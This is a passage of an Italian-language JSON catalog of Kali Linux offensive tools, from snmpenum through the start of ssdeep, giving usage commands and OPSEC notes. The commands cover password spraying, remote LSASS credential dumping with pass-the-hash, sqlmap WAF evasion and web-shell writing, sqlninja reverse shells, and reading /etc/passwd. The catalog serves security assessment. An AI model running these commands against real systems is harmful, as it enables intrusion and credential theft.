    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SNMPEnum è uno script Perl per enumerazione SNMP che utilizza file di configurazione con OID comuni per estrarre informazioni da dispositivi di rete. Supporta query mirate per diversi tipi di device.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>OID Files:</strong> configurazioni per Windows, Linux, Cisco, etc.</p><p><strong>Bulk Queries:</strong> estrae multiple informazioni in una sessione</p><p><strong>Custom OID:</strong> supporta file OID personalizzati</p><p><strong>Output Parsing:</strong> formatta risultati leggibilmente</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration Windows\nsnmpenum -t 192.168.1.100 -c public -w\n\n# Enumeration con file OID custom\nsnmpenum -t 192.168.1.100 -c public -i linux.txt\n\n# Enumeration Cisco\nsnmpenum -t 192.168.1.1 -c public -i cisco.txt\n\n# Output verboso\nsnmpenum -t 192.168.1.100 -c public -w -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Windows enumeration</strong>, estrae utenti, share, servizi via SNMP. Per <strong>network devices</strong>, raccoglie configurazioni router/switch. Per <strong>discovery</strong>, identifica tipi di dispositivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffic:</strong> genera molte query SNMP. <strong>Detection:</strong> pattern riconoscibile da IDS. <strong>Community:</strong> brute force community può essere loggato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "sparrow-wifi",
    "name": "sparrow-wifi",
    "version": "0.0~git20240725",
    "icon": "../app/icons/sparrow-wifi-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sparrow-wifi/",
    "desc": "Analizzatore WiFi con GUI per spectrum analysis, geolocalizzazione e drone hunting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sparrow-WiFi è un analizzatore wireless con interfaccia grafica per spectrum analysis, geolocalizzazione e drone detection. Integra GPS per mapping, supporta HackRF per analisi spectrum e ha funzionalità di drone hunting.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WiFi Analysis:</strong> visualizza AP, client, signal strength</p><p><strong>GPS Integration:</strong> geolocalizza access point su mappa</p><p><strong>Spectrum Analysis:</strong> supporto HackRF per RF spectrum</p><p><strong>Drone Detection:</strong> identifica segnali WiFi droni comuni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI\nsparrow-wifi\n\n# Con interfaccia specifica\nsparrow-wifi -i wlan0\n\n# Abilita GPS\nsparrow-wifi -i wlan0 --gps\n\n# Modalità drone hunting\nsparrow-wifi -i wlan0 --drone</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>wireless audit</strong>, mappa reti WiFi nell'area. Per <strong>wardriving</strong>, raccoglie dati geolocalizzati su AP. Per <strong>security</strong>, rileva droni non autorizzati via WiFi signature.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Monitor Mode:</strong> richiede scheda in monitor mode. <strong>Legal:</strong> wardriving può avere implicazioni legali. <strong>Privacy:</strong> raccolta dati WiFi regolamentata in alcune giurisdizioni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "spiderfoot",
    "name": "spiderfoot",
    "version": "4.0",
    "icon": "../app/icons/spiderfoot-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spiderfoot/",
    "desc": "Piattaforma OSINT automatizzata con 200+ moduli per footprinting e threat intelligence.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SpiderFoot è una piattaforma OSINT automatizzata con oltre 200 moduli per footprinting e threat intelligence. Raccoglie dati da fonti pubbliche, correla informazioni e genera report completi con visualizzazioni grafiche.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>200+ Modules:</strong> DNS, WHOIS, social, breach data, dark web</p><p><strong>Correlation Engine:</strong> collega entità automaticamente</p><p><strong>Web Interface:</strong> GUI browser-based per gestione scan</p><p><strong>API Integration:</strong> supporta Shodan, VirusTotal, HaveIBeenPwned</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia web interface\nspiderfoot -l 127.0.0.1:5001\n\n# Scan CLI su dominio\nspiderfoot -s target.com -t DOMAIN_NAME\n\n# Scan su IP\nspiderfoot -s 192.168.1.1 -t IP_ADDRESS\n\n# Con moduli specifici\nspiderfoot -s target.com -m sfp_dnsresolve,sfp_whois</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>threat intelligence</strong>, indaga su attori malevoli. Per <strong>due diligence</strong>, verifica aziende e persone. Per <strong>attack surface</strong>, mappa esposizione digitale di un'organizzazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Keys:</strong> molti moduli richiedono chiavi API. <strong>Passive vs Active:</strong> alcuni moduli generano traffico verso il target. <strong>Data Storage:</strong> risultati contengono dati sensibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "spike",
    "name": "spike",
    "version": "2.9",
    "icon": "../app/icons/spike-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spike/",
    "desc": "Fuzzer per protocolli di rete: genera input malformati per trovare crash e bug.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SPIKE è un fuzzer per protocolli di rete che genera input malformati per trovare crash e vulnerabilità. Include interpreti per protocolli comuni e permette di definire template custom per fuzzing mirato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Templates:</strong> template per HTTP, SIP, IMAP, etc.</p><p><strong>Custom Fuzzing:</strong> API C per definire strutture dati</p><p><strong>Block-Based:</strong> modello a blocchi per protocolli binari</p><p><strong>Mutation Engine:</strong> genera variazioni automatiche</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fuzzing HTTP\ngeneric_send_tcp 192.168.1.100 80 http.spk 0 0\n\n# Fuzzing FTP\ngeneric_send_tcp 192.168.1.100 21 ftp.spk 0 0\n\n# Fuzzing con offset specifico\ngeneric_send_tcp target 80 custom.spk 5 10\n\n# UDP fuzzing\ngeneric_send_udp target 53 dns.spk 0 0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability research</strong>, trova crash in implementazioni network. Per <strong>protocol testing</strong>, verifica robustezza parser. Per <strong>exploit development</strong>, identifica input che causano comportamenti anomali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Crash:</strong> può causare denial of service sui target. <strong>Authorization:</strong> solo su sistemi autorizzati. <strong>Monitoring:</strong> monitorare target per crash durante fuzzing.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "sploitscan",
    "name": "sploitscan",
    "version": "0.10.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sploitscan/",
    "desc": "Cerca CVE e exploit disponibili aggregando info da NVD, EPSS, CISA KEV.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SploitScan è uno strumento che aggrega informazioni su CVE da multiple fonti: NVD, EPSS, CISA KEV, Exploit-DB. Fornisce una vista unificata su severità, probabilità di exploit e disponibilità di PoC.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> NVD, EPSS, CISA KEV, Exploit-DB</p><p><strong>EPSS Score:</strong> probabilità di exploitation nei prossimi 30 giorni</p><p><strong>KEV Status:</strong> verifica se CVE è in CISA Known Exploited</p><p><strong>PoC Links:</strong> trova exploit pubblici disponibili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca informazioni su CVE\nsploitscan CVE-2024-1234\n\n# Multipli CVE\nsploitscan CVE-2024-1234 CVE-2024-5678\n\n# Da file\nsploitscan -f cve_list.txt\n\n# Output JSON\nsploitscan CVE-2024-1234 -o json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability prioritization</strong>, valuta rischio reale di CVE. Per <strong>threat intel</strong>, identifica vulnerabilità attivamente sfruttate. Per <strong>exploit research</strong>, trova PoC disponibili pubblicamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Limits:</strong> alcune fonti hanno rate limiting. <strong>Internet Required:</strong> richiede connettività per query. <strong>Data Currency:</strong> informazioni dipendono da aggiornamento fonti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "spooftooph",
    "name": "spooftooph",
    "version": "0.5.2",
    "icon": "../app/icons/spooftooph-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spooftooph/",
    "desc": "Clona dispositivi Bluetooth spoofando indirizzo MAC e device class per attacchi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Spooftooph è uno strumento per spoofing Bluetooth che clona l'identità di dispositivi BT. Modifica indirizzo MAC, device name e class del dispositivo locale per impersonare altri device Bluetooth.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MAC Spoofing:</strong> cambia BD_ADDR del dispositivo locale</p><p><strong>Name Cloning:</strong> copia nome del dispositivo target</p><p><strong>Class Spoofing:</strong> replica device class (phone, headset, etc.)</p><p><strong>Profile Selection:</strong> salva/carica profili dispositivo</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione dispositivi nelle vicinanze\nspooftooph -s\n\n# Clona dispositivo specifico\nspooftooph -i hci0 -a 00:11:22:33:44:55 -n \"iPhone\"\n\n# Randomizza MAC\nspooftooph -i hci0 -r\n\n# Salva profilo\nspooftooph -i hci0 -w profile.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>BT security testing</strong>, valuta trust basato su identità. Per <strong>social engineering</strong>, impersona dispositivi trusted. Per <strong>privacy</strong>, nasconde vera identità Bluetooth.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware:</strong> richiede adapter BT che supporta spoofing. <strong>Legal:</strong> impersonare dispositivi può essere illegale. <strong>Range:</strong> Bluetooth ha range limitato, richiede prossimità.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "spray",
    "name": "spray",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spray/",
    "desc": "Password spraying tool per Active Directory via SMB con rate limiting integrato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Spray è uno strumento per password spraying su Active Directory via protocollo SMB. Include rate limiting integrato per evitare lockout account e supporta liste di utenti e password per attacchi mirati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SMB Authentication:</strong> verifica credenziali via SMB/NTLM</p><p><strong>Rate Limiting:</strong> delay configurabile tra tentativi</p><p><strong>Lockout Aware:</strong> evita lockout con threshold configurato</p><p><strong>Multi-Password:</strong> testa multiple password su utenti</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Spray singola password su lista utenti\nspray -u users.txt -p 'Password123' -d domain.local 192.168.1.10\n\n# Con delay tra tentativi\nspray -u users.txt -p 'Summer2024!' -d domain.local -t 3 192.168.1.10\n\n# Lista password\nspray -u users.txt -P passwords.txt -d domain.local 192.168.1.10\n\n# Output verboso\nspray -u users.txt -p 'Welcome1' -d domain.local -v 192.168.1.10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD assessment</strong>, identifica utenti con password deboli. Per <strong>initial access</strong>, trova credenziali valide senza lockout. Per <strong>policy testing</strong>, verifica enforcement password policy.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> rispettare threshold per evitare blocchi. <strong>Logging:</strong> tentativi loggati in Security event log (4625). <strong>Detection:</strong> pattern spraying riconoscibile da SIEM.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Spraying"
    ],
    "notes": null
  },
  {
    "id": "sprayhound",
    "name": "sprayhound",
    "version": "0.0~git20241231.5e7bf94",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sprayhound/",
    "desc": "Password spraying sicuro su AD con integrazione BloodHound per evitare lockout.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SprayHound è uno strumento di password spraying per Active Directory che integra dati BloodHound per evitare lockout. Consulta i bad password count degli utenti prima dello spray per operare in modo sicuro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>BloodHound Integration:</strong> usa dati Neo4j per info utenti</p><p><strong>Lockout Aware:</strong> controlla badPwdCount prima di spray</p><p><strong>Threshold Respect:</strong> si ferma prima del lockout threshold</p><p><strong>Smart Targeting:</strong> seleziona utenti sicuri da testare</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Spray con controllo BloodHound\nsprayhound -u users.txt -p 'Password123' -d domain.local -dc dc01.domain.local\n\n# Con connessione Neo4j\nsprayhound -u users.txt -p 'Welcome1' --neo4j-uri bolt://localhost:7687\n\n# Specifica threshold\nsprayhound -u users.txt -p 'Summer2024!' -d domain.local --threshold 3</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>safe spraying</strong>, evita lockout account durante assessment. Per <strong>targeted attacks</strong>, seleziona utenti con badPwdCount basso. Per <strong>AD testing</strong>, verifica password policy senza causare disservizi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>BloodHound Data:</strong> richiede dati raccolti precedentemente. <strong>Logging:</strong> tentativi comunque loggati nel DC. <strong>Timing:</strong> rispettare observation window della policy.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Spraying"
    ],
    "notes": null
  },
  {
    "id": "sprayingtoolkit",
    "name": "sprayingtoolkit",
    "version": "0.0~git20201009.68f295d",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sprayingtoolkit/",
    "desc": "Password spray su OWA, Lync, ADFS e altri portali Microsoft cloud e on-premise.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SprayingToolkit è una suite per password spraying su servizi Microsoft: OWA, Lync/Skype for Business, ADFS, O365. Include moduli specifici per ogni servizio con gestione rate limiting.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Service:</strong> OWA, Lync, ADFS, Office 365</p><p><strong>User Enumeration:</strong> verifica esistenza utenti prima dello spray</p><p><strong>Rate Limiting:</strong> delay configurabile per evitare blocchi</p><p><strong>Atomizer Module:</strong> spray su diverse piattaforme</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Spray su OWA\natomizer owa https://mail.target.com users.txt password.txt\n\n# Spray su Lync\natomizer lync https://lyncdiscover.target.com users.txt password.txt\n\n# Spray su ADFS\natomizer adfs https://adfs.target.com users.txt password.txt\n\n# Con delay\natomizer owa https://mail.target.com users.txt pass.txt --interval 5</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>external assessment</strong>, testa portali Microsoft esposti. Per <strong>initial access</strong>, trova credenziali per accesso OWA/O365. Per <strong>phishing prep</strong>, identifica utenti con password deboli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> servizi cloud hanno throttling aggressivo. <strong>MFA:</strong> molti servizi richiedono secondo fattore. <strong>Logging:</strong> Azure AD logga tutti i tentativi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Spraying"
    ],
    "notes": null
  },
  {
    "id": "spraykatz",
    "name": "spraykatz",
    "version": "0.9.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/spraykatz/",
    "desc": "Dumpa credenziali da memoria LSASS su host Windows remoti via procdump e Mimikatz.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SprayKatz è uno strumento per credential dumping remoto che utilizza procdump per creare dump LSASS e pypykatz per estrazione offline. Automatizza il processo su multipli host Windows.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Remote Dumping:</strong> esegue procdump via SMB/WMI remoto</p><p><strong>Offline Extraction:</strong> analizza dump con pypykatz</p><p><strong>Mass Deployment:</strong> opera su liste di host</p><p><strong>Cleanup:</strong> rimuove dump dopo estrazione</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dump da singolo host\nspraykatz -u admin -p password -d domain.local -t 192.168.1.100\n\n# Da lista di host\nspraykatz -u admin -p password -d domain.local -T hosts.txt\n\n# Con hash NTLM\nspraykatz -u admin -H aad3b435b51404eeaad3b435b51404ee:hash -t 192.168.1.100\n\n# Output directory\nspraykatz -u admin -p pass -d domain.local -t target -o ./output</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>credential harvesting</strong>, raccoglie password da host compromessi. Per <strong>lateral movement prep</strong>, ottiene credenziali per pivot. Per <strong>domain escalation</strong>, cerca credenziali privilegiate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>EDR Detection:</strong> procdump e dump LSASS altamente monitorati. <strong>Sysmon:</strong> eventi 1, 10 rivelano l'attività. <strong>AV:</strong> Mimikatz e pypykatz sono signature-based.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "sqldict",
    "name": "sqldict",
    "version": "2.1",
    "icon": "../app/icons/sqldict-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqldict/",
    "desc": "Brute force password per account SQL Server usando wordlist e parallel attacks.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SQLDict è uno strumento per brute force di password su Microsoft SQL Server. Effettua attacchi dizionario paralleli per testare la robustezza delle credenziali degli account database.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> usa wordlist per brute force</p><p><strong>Parallel Connections:</strong> multiple connessioni simultanee</p><p><strong>User Enumeration:</strong> testa liste di username</p><p><strong>MSSQL Focus:</strong> ottimizzato per SQL Server</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force su sa\nsqldict 192.168.1.100 sa passwords.txt\n\n# Con porta custom\nsqldict 192.168.1.100:1434 sa passwords.txt\n\n# Multipli utenti\nsqldict 192.168.1.100 users.txt passwords.txt\n\n# Threads paralleli\nsqldict 192.168.1.100 sa passwords.txt -t 10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>database assessment</strong>, verifica password account SQL. Per <strong>pentest</strong>, tenta accesso a database MSSQL. Per <strong>audit</strong>, controlla enforcement password policy.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> SQL Server può avere lockout policy. <strong>Logging:</strong> tentativi falliti loggati in SQL errorlog. <strong>Detection:</strong> molte connessioni fallite generano alert.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlmap",
    "name": "sqlmap",
    "version": "1.9.8",
    "icon": "../app/icons/sqlmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlmap/",
    "desc": "Tool automatico per SQL injection: detection, exploitation, data extraction e takeover.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SQLMap è lo strumento di riferimento per detection e exploitation automatica di SQL injection. Supporta tutti i DBMS principali, tecniche di injection multiple e funzionalità avanzate come OS shell e database takeover.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Detection:</strong> identifica tipo SQLi e DBMS automaticamente</p><p><strong>Full DBMS Support:</strong> MySQL, PostgreSQL, MSSQL, Oracle, SQLite</p><p><strong>Data Extraction:</strong> dump database, tabelle, colonne</p><p><strong>OS Access:</strong> shell, file read/write su sistemi vulnerabili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration completa con risk e level alti\nsqlmap -u \"http://target.com/page?id=1\" --dbs --risk=3 --level=5 --batch\n\n# Da Burp request file con cookie e proxy\nsqlmap -r request.txt --batch --proxy=http://127.0.0.1:8080 \\\n  --cookie=\"PHPSESSID=abc123\" --random-agent\n\n# Dump specifico con evasione WAF avanzata\nsqlmap -u \"http://target.com/page?id=1\" -D mydb -T users --dump \\\n  --tamper=\"between,randomcase,space2comment\" --delay=2\n\n# Second-order injection\nsqlmap -u \"http://target.com/view\" --second-url=\"http://target.com/result\" \\\n  --data=\"input=*\" --technique=U\n\n# OS shell con tecniche alternative\nsqlmap -u \"http://target.com/page?id=1\" --os-shell --technique=E \\\n  --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php\n\n# Time-based blind con threads ottimizzati\nsqlmap -u \"http://target.com/page?id=1\" --technique=T --time-sec=3 --threads=10\n\n# POST JSON API con header custom\nsqlmap -u \"http://api.target.com/search\" --data='{\"query\":\"*\"}' \\\n  --method=POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer xxx\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web pentest</strong>, testa e sfrutta SQL injection. Per <strong>data extraction</strong>, recupera contenuti database. Per <strong>privilege escalation</strong>, ottiene shell o accesso filesystem.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> genera molte richieste anomale. <strong>WAF:</strong> facilmente bloccato, usare tamper scripts. <strong>Logging:</strong> tutte le query loggabili lato server.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlmc",
    "name": "sqlmc",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlmc/",
    "desc": "Crawla sito web cercando parametri SQL injectable e testa automaticamente per SQLi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SQLMC (SQL Mass Checker) è uno scanner che crawla siti web alla ricerca di parametri vulnerabili a SQL injection. Combina web crawling con testing automatico per identificare punti di injection.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Crawling:</strong> esplora automaticamente il sito target</p><p><strong>Parameter Discovery:</strong> identifica parametri GET/POST</p><p><strong>SQLi Testing:</strong> testa payload injection comuni</p><p><strong>Report Generation:</strong> genera report vulnerabilità trovate</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan sito per SQLi\nsqlmc -u http://target.com/\n\n# Con depth crawling\nsqlmc -u http://target.com/ -d 3\n\n# Specifica thread\nsqlmc -u http://target.com/ -t 10\n\n# Output file\nsqlmc -u http://target.com/ -o results.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability discovery</strong>, trova punti SQLi in applicazioni grandi. Per <strong>bug bounty</strong>, scansiona rapidamente per low-hanging fruit. Per <strong>security assessment</strong>, identifica parametri da testare manualmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> crawling genera molto traffico. <strong>Detection:</strong> pattern injection riconoscibili da WAF. <strong>False Positives:</strong> verificare manualmente i risultati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlninja",
    "name": "sqlninja",
    "version": "0.2.6",
    "icon": "../app/icons/sqlninja-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlninja/",
    "desc": "Exploita SQL injection su MSSQL per shell, privilege escalation e data exfiltration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SQLNinja è uno strumento specializzato per exploitation di SQL injection su Microsoft SQL Server. Focalizzato su post-exploitation, permette di ottenere shell, escalare privilegi e exfiltrare dati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MSSQL Focus:</strong> ottimizzato per SQL Server</p><p><strong>Shell Upload:</strong> carica backdoor via xp_cmdshell</p><p><strong>Privilege Escalation:</strong> tecniche per elevare a sa</p><p><strong>DNS Exfiltration:</strong> estrae dati via query DNS</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fingerprint database\nsqlninja -m fingerprint\n\n# Brute force sa password\nsqlninja -m bruteforce\n\n# Upload shell\nsqlninja -m upload\n\n# Ottieni reverse shell\nsqlninja -m backscan\n\n# Escalation\nsqlninja -m escalation</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>MSSQL exploitation</strong>, sfrutta SQLi per accesso sistema. Per <strong>data exfil</strong>, estrae dati quando canali tradizionali sono bloccati. Per <strong>privilege escalation</strong>, eleva da db_owner a sysadmin.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>xp_cmdshell:</strong> spesso disabilitato e monitorato. <strong>Detection:</strong> attività SQL anomale facilmente rilevabili. <strong>Logging:</strong> tutte le query in SQL Server logs.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlsus",
    "name": "sqlsus",
    "version": "0.7.2",
    "icon": "../app/icons/sqlsus-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlsus/",
    "desc": "Injection tool MySQL con interfaccia command-line per dump database e file read.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SQLSus è uno strumento di SQL injection specializzato per MySQL. Offre interfaccia command-line interattiva per esplorare database, dumpare dati e leggere file dal filesystem del server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MySQL Focus:</strong> ottimizzato per MySQL/MariaDB</p><p><strong>Interactive Shell:</strong> CLI simile a MySQL client</p><p><strong>File Read:</strong> legge file via LOAD_FILE()</p><p><strong>Auto-Detection:</strong> identifica columns e union-based injection</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera configurazione\nsqlsus -g config.cfg\n\n# Avvia con config\nsqlsus config.cfg\n\n# Comandi interattivi:\nstart          # inizia injection\nget databases  # lista database\nget tables     # lista tabelle\nget columns    # lista colonne\nget file /etc/passwd  # legge file</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>MySQL exploitation</strong>, esplora database via SQLi. Per <strong>file read</strong>, accede a file di configurazione. Per <strong>data extraction</strong>, dumpa tabelle con credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>File Permissions:</strong> LOAD_FILE richiede FILE privilege. <strong>Logging:</strong> query loggabili in slow query log. <strong>Detection:</strong> UNION-based injection facilmente rilevabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "ssdeep",
    "name": "ssdeep",
    "version": "2.14.1",
    "icon": "../app/icons/ssdeep-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ssdeep/",
    "desc": "Calcola fuzzy hash per identificare file simili in analisi malware e forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ssdeep è uno strumento per calcolare fuzzy hash (context-triggered piecewise hashing). A differenza di hash crittografici, identifica file simili anche con modifiche minori, utile per clustering malware.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fuzzy Hashing:</strong> CTPH per similarity detection</p><p><strong>Comparison:</strong> calcola percentuale similarità tra file</p><p><strong>Recursive:</strong> processa directory ricorsivamente</p><p><strong>Cluster Analysis:</strong> raggruppa file simili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera database hash da samples noti\nssdeep -b -r /malware/known_families/ &gt; malware_signatures.ssdeep\n\n# Confronta sample sospetto contro database\nssdeep -m malware_signatures.ssdeep -t 70 suspect.exe  # threshold 70%\n\n# Clustering malware: trova varianti simili\nssdeep -p -r /samples/ | sort -t: -k3 -nr | head -50  # top 50 matches\n\n# Pipeline con VirusTotal hash per triage\nfor f in /incoming/*.exe; do\n  ssdeep \"$f\" &gt;&gt; hashes.txt\n  sha256=$(sha256sum \"$f\" | cut -d' ' -f1)\n  curl -s \"https://www.virustotal.com/api/v3/files/$sha256\" -H \"x-apikey: KEY\"\ndone\n\n# Confronto cross-directory per similarity\nssdeep -l -r /samples/family_a/ &gt; family_a.ssdeep\nssdeep -x family_a.ssdeep -r /samples/unknown/\n\n# Output CSV per analisi in Jupyter/Pandas\nssdeep -c -r /samples/ &gt; similarity_matrix.csv</code></pre><br><hr><h4 class=\"rt-amber\">Casi 